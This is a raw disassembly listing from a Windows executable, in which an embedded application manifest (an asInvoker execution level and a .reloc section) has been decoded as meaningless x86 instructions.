  4044b7:	outs   dx,DWORD PTR ds:[esi]
  4044b8:	outs   dx,BYTE PTR ds:[esi]
  4044b9:	gs cmp eax,0x73657922
  4044bf:	and    bh,BYTE PTR [edi]
  4044c1:	ds or  eax,0x73613c0a
  4044c7:	jae    0x40452e
  4044c9:	ins    DWORD PTR es:[edi],dx
  4044ca:	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
  4044ce:	js     0x40453d
  4044d0:	ins    BYTE PTR es:[edi],dx
  4044d1:	outs   dx,BYTE PTR ds:[esi]
  4044d2:	jae    0x404511
  4044d4:	and    dh,BYTE PTR [ebp+0x72]
  4044d7:	outs   dx,BYTE PTR ds:[esi]
  4044d8:	cmp    dh,BYTE PTR [ebx+0x63]
  4044db:	push   0x73616d65
  4044e0:	sub    eax,0x7263696d
  4044e5:	outs   dx,DWORD PTR ds:[esi]
  4044e6:	jae    0x404557
  4044e8:	data16 je 0x404518
  4044eb:	arpl   WORD PTR [edi+0x6d],bp
  4044ee:	cmp    ah,BYTE PTR [ecx+0x73]
  4044f1:	ins    DWORD PTR es:[edi],dx
  4044f2:	cs jbe 0x404526
  4044f5:	and    ah,BYTE PTR [eax]
  4044f7:	ins    DWORD PTR es:[edi],dx
  4044f8:	popa   
  4044f9:	outs   dx,BYTE PTR ds:[esi]
  4044fa:	imul   esp,DWORD PTR [esi+0x65],0x65567473
  404501:	jb     0x404576
  404503:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  40450a:	xor    BYTE PTR [edx],ah
  40450c:	ds or  eax,0x3c20200a
  404512:	popa   
  404513:	jae    0x404588
  404515:	gs ins DWORD PTR es:[edi],dx
  404517:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  40451b:	fs outs dx,BYTE PTR gs:[esi]
  40451e:	je     0x404589
  404520:	je     0x40459b
  404522:	and    BYTE PTR [esi+0x65],dh
  404525:	jb     0x40459a
  404527:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  40452e:	xor    BYTE PTR [esi],ch
  404530:	xor    BYTE PTR [esi],ch
  404532:	xor    BYTE PTR [edx],ah
  404534:	and    BYTE PTR [esi+0x61],ch
  404537:	ins    DWORD PTR es:[edi],dx
  404538:	gs cmp eax,0x41794d22
  40453e:	jo     0x4045b0
  404540:	ins    BYTE PTR es:[edi],dx
  404541:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  404548:	cs popa 
  40454a:	jo     0x4045bc
  40454c:	and    ch,BYTE PTR [edi]
  40454e:	ds or  eax,0x3c20200a
  404554:	je     0x4045c8
  404556:	jne    0x4045cb
  404558:	je     0x4045a3
  40455a:	outs   dx,BYTE PTR ds:[esi]
  40455b:	outs   dx,WORD PTR ds:[esi]
  40455d:	and    BYTE PTR [eax+0x6d],bh
  404560:	ins    BYTE PTR es:[edi],dx
  404561:	outs   dx,BYTE PTR ds:[esi]
  404562:	jae    0x4045a1
  404564:	and    dh,BYTE PTR [ebp+0x72]
  404567:	outs   dx,BYTE PTR ds:[esi]
  404568:	cmp    dh,BYTE PTR [ebx+0x63]
  40456b:	push   0x73616d65
  404570:	sub    eax,0x7263696d
  404575:	outs   dx,DWORD PTR ds:[esi]
  404576:	jae    0x4045e7
  404578:	data16 je 0x4045a8
  40457b:	arpl   WORD PTR [edi+0x6d],bp
  40457e:	cmp    ah,BYTE PTR [ecx+0x73]
  404581:	ins    DWORD PTR es:[edi],dx
  404582:	cs jbe 0x4045b7
  404585:	and    bh,BYTE PTR [esi]
  404587:	or     eax,0x2020200a
  40458c:	and    BYTE PTR [ebx+esi*2],bh
  40458f:	arpl   WORD PTR gs:[ebp+0x72],si
  404593:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a0d
  40459b:	and    BYTE PTR [eax],ah
  40459d:	and    BYTE PTR [eax],ah
  40459f:	cmp    al,0x72
  4045a1:	gs jno 0x404619
  4045a4:	gs jae 0x40461b
  4045a7:	gs fs push eax
  4045aa:	jb     0x404615
  4045ac:	jbe    0x404617
  4045ae:	ins    BYTE PTR es:[edi],dx
  4045af:	gs addr16 gs jae 0x4045d4
  4045b4:	js     0x404623
  4045b6:	ins    BYTE PTR es:[edi],dx
  4045b7:	outs   dx,BYTE PTR ds:[esi]
  4045b8:	jae    0x4045f7
  4045ba:	and    dh,BYTE PTR [ebp+0x72]
  4045bd:	outs   dx,BYTE PTR ds:[esi]
  4045be:	cmp    dh,BYTE PTR [ebx+0x63]
  4045c1:	push   0x73616d65
  4045c6:	sub    eax,0x7263696d
  4045cb:	outs   dx,DWORD PTR ds:[esi]
  4045cc:	jae    0x40463d
  4045ce:	data16 je 0x4045fe
  4045d1:	arpl   WORD PTR [edi+0x6d],bp
  4045d4:	cmp    ah,BYTE PTR [ecx+0x73]
  4045d7:	ins    DWORD PTR es:[edi],dx
  4045d8:	cs jbe 0x40460e
  4045db:	and    bh,BYTE PTR [esi]
  4045dd:	or     eax,0x2020200a
  4045e2:	and    BYTE PTR [eax],ah
  4045e4:	and    BYTE PTR [eax],ah
  4045e6:	and    BYTE PTR [edx+esi*2],bh
  4045e9:	gs jno 0x404661
  4045ec:	gs jae 0x404663
  4045ef:	gs fs inc ebp
  4045f2:	js     0x404659
  4045f4:	arpl   WORD PTR [ebp+0x74],si
  4045f7:	imul   ebp,DWORD PTR [edi+0x6e],0x6576654c
  4045fe:	ins    BYTE PTR es:[edi],dx
  4045ff:	and    BYTE PTR [ebp+eiz*2+0x76],ch
  404603:	gs ins BYTE PTR es:[edi],dx
  404605:	cmp    eax,0x49736122
  40460a:	outs   dx,BYTE PTR ds:[esi]
  40460b:	jbe    0x40467c
  40460d:	imul   esp,DWORD PTR [ebp+0x72],0x22
  404611:	and    BYTE PTR [ebp+0x69],dh
  404614:	inc    ecx
  404615:	arpl   WORD PTR [ebx+0x65],sp
  404618:	jae    0x40468d
  40461a:	cmp    eax,0x6c616622
  40461f:	jae    0x404686
  404621:	and    ch,BYTE PTR [edi]
  404623:	ds or  eax,0x2020200a
  404629:	and    BYTE PTR [eax],ah
  40462b:	and    BYTE PTR [edi+ebp*1],bh
  40462e:	jb     0x404695
  404630:	jno    0x4046a7
  404632:	gs jae 0x4046a9
  404635:	gs fs push eax
  404638:	jb     0x4046a3
  40463a:	jbe    0x4046a5
  40463c:	ins    BYTE PTR es:[edi],dx
  40463d:	gs addr16 gs jae 0x404680
  404642:	or     eax,0x2020200a
  404647:	and    BYTE PTR [edi+ebp*1],bh
  40464a:	jae    0x4046b1
  40464c:	arpl   WORD PTR [ebp+0x72],si
  40464f:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a0d
  404657:	cmp    al,0x2f
  404659:	je     0x4046cd
  40465b:	jne    0x4046d0
  40465d:	je     0x4046a8
  40465f:	outs   dx,BYTE PTR ds:[esi]
  404660:	outs   dx,WORD PTR ds:[esi]
  404662:	ds or  eax,0x612f3c0a
  404668:	jae    0x4046dd
  40466a:	gs ins DWORD PTR es:[edi],dx
  40466c:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  404670:	or     eax,0xa
  404675:	add    BYTE PTR [eax],al
	...

Disassembly of section .reloc:

00406000 <.reloc>:
  406000:	add    BYTE PTR [eax],dh
  406002:	add    BYTE PTR [eax],al
  406004:	or     al,0x0
  406006:	add    BYTE PTR [eax],al
  406008:	pusha  
  406009:	xor    DWORD PTR [eax],eax
	...
